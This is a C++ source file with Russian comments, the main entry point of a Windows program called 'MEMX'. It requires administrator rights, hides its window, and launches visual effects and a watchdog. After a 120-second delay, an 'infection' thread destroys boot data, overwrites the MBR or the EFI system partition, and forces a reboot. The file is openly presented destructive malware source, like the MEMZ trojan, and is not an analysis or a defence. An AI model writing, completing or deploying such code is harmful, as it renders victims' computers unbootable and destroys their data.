#include <windows.h>
#include <cstdio>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:WinMainCRTStartup")

// ================================================================
// ВНЕШНИЕ ОБЪЯВЛЕНИЯ
// ================================================================

// Из effects.cpp
extern void StartEffects();

// Из watchdog.cpp
extern void StartWatchdog();

// Из mbr.c
#ifdef __cplusplus
extern "C" {
#endif
    int IsAdmin(void);
    void KillBootData(void);
    int WriteMBR(void);
    int WriteESP(void);
    int IsUEFIActive(void);
    int EnablePrivilege(void);
    void TriggerBSOD(void);  // из watchdog.cpp
#ifdef __cplusplus
}
#endif

// ================================================================
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ================================================================

volatile bool g_running = true;

// ================================================================
// ФУНКЦИЯ ЗАРАЖЕНИЯ С ЗАДЕРЖКОЙ
// ================================================================

DWORD WINAPI InfectionThread(LPVOID lpParam) {
    // Ждём 120 секунд
    Sleep(120000);
    
    // Получаем привилегии
    EnablePrivilege();
    
    // Уничтожаем загрузочные данные
    KillBootData();
    
    // Определяем тип системы и заражаем
    if (IsUEFIActive()) {
        // UEFI режим
        if (!WriteESP()) {
            WriteESP();  // повтор
        }
    } else {
        // BIOS режим
        if (!WriteMBR()) {
            WriteMBR();  // повтор
        }
    }
    
    // Принудительная перезагрузка
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
    
    return 0;
}

// ================================================================
// ТОЧКА ВХОДА
// ================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {

    // ====== РЕЖИМ WATCHDOG ======
    if (strstr(lpCmdLine, "/watchdog")) {
        while (TRUE) Sleep(5000);
        return 0;
    }

    // ====== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ======
    if (!IsAdmin()) {
        MessageBoxA(NULL, "Run as administrator!", "MEMX", MB_ICONERROR);
        return 1;
    }

    // ====== СОЗДАНИЕ СКРЫТОГО ОКНА ======
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DefWindowProcA;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MEMXClass";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(0, "MEMXClass", "MEMX",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
        1, 1, NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, SW_HIDE);

    // ====== ЗАПУСК ЭФФЕКТОВ (из effects.cpp) ======
    StartEffects();

    // ====== ЗАПУСК WATCHDOG (из watchdog.cpp) ======
    StartWatchdog();

    // ====== ЗАПУСК ПОТОКА ЗАРАЖЕНИЯ С ЗАДЕРЖКОЙ 120 СЕК ======
    HANDLE hThread = CreateThread(NULL, 0, InfectionThread, NULL, 0, NULL);
    CloseHandle(hThread);

    // ====== ЦИКЛ ОБРАБОТКИ СООБЩЕНИЙ ======
    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}